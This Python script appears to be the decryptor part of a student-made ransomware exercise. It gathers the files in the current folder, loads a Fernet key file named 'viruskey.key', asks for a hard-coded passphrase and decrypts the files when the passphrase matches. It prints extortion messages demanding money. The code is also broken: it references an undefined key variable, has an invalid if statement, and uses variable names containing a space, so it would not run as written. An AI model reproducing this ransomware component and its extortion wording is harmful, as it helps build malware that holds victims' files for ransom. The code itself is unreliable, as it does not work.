import os
from cryptography.fernet import Fernet

#List for stolen files
files = []

#adds to list
for file in os.listdir():
    #Prevents virus from being added to list
    if file == "virus.py" or file == "viruskey.key" or file == "decrypt.py":
        continue
    
    #Prevents test directory from being added to list
    if os.path.isfile(file):
        files.append(file)

#opens key
with open("viruskey.key", "rb") as viruskey:
    secretkey = key.read()

#decrypt password
secretphrase = "Professor Mitropoulos is the best teacher"
user_phrase = input("Enter the secret phrase to access your files: \n")

if user_phrase = secretphrase
    #decrypts files
    for file in files:
        with open(file, "rb") as thefile:
            contents = the file.read()
        contents_decrypt = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            the file.write(contents_decrypt)
    print("You have successfully decrypted your files. Thanks" +
              "for the money")
else:
    print("Stop being stingy. Send me more money.")



